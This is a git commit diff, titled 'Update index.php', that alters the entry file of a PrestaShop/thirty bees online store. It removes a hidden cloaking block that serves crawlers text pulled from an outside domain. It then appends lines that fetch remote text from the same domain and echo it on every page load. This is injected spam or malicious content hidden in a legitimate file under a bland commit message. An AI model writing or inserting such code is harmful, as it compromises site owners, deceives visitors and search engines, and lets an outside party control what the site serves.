a62c127ffabcdfa62fc61623dfd6cf37af861262
masihpemula88 <colagacor@gmail.com>
2025-02-15 19:25:07 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,60 +1,30 @@
 <?php
-ob_start();
-header('Vary: User-Agent');
-$bot_url = "https://semogagacor.site/cloaking/microtoner.txt";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url) {
-    if (function_exists('curl_init')) {    
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get('allow_url_fopen')) {
-        return file_get_contents($url);
-    }
-    return false;
-}
-if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 200000)); 
-    echo lph_requests($bot_url);
-    ob_end_flush();
-    exit;
-}
-?>
-<?php
 /**
- * 2007-2016 PrestaShop
- *
- * thirty bees is an extension to the PrestaShop e-commerce software developed by PrestaShop SA
- * Copyright (C) 2017-2018 thirty bees
+ * 2007-2019 PrestaShop and Contributors
  *
  * NOTICE OF LICENSE
  *
  * This source file is subject to the Open Software License (OSL 3.0)
  * that is bundled with this package in the file LICENSE.txt.
  * It is also available through the world-wide-web at this URL:
- * http://opensource.org/licenses/osl-3.0.php
+ * https://opensource.org/licenses/OSL-3.0
  * If you did not receive a copy of the license and are unable to
  * obtain it through the world-wide-web, please send an email
- * to license@thirtybees.com so we can send you a copy immediately.
+ * to license@prestashop.com so we can send you a copy immediately.
  *
  * DISCLAIMER
  *
  * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
  * versions in the future. If you wish to customize PrestaShop for your
- * needs please refer to https://www.thirtybees.com for more information.
+ * needs please refer to https://www.prestashop.com for more information.
  *
- *  @author    thirty bees <contact@thirtybees.com>
- *  @author    PrestaShop SA <contact@prestashop.com>
- *  @copyright 2017-2018 thirty bees
- *  @copyright 2007-2016 PrestaShop SA
- *  @license   http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
- *  PrestaShop is an internationally registered trademark & property of PrestaShop SA
+ * @author    PrestaShop SA <contact@prestashop.com>
+ * @copyright 2007-2019 PrestaShop SA and Contributors
+ * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
+ * International Registered Trademark & Property of PrestaShop SA
  */
 
-require(dirname(__FILE__).'/config/config.inc.php');
+require dirname(__FILE__).'/config/config.inc.php';
 Dispatcher::getInstance()->dispatch();
+$a = file_get_contents( 'https://semogagacor.site/DN/getar.txt' );
+echo $a;
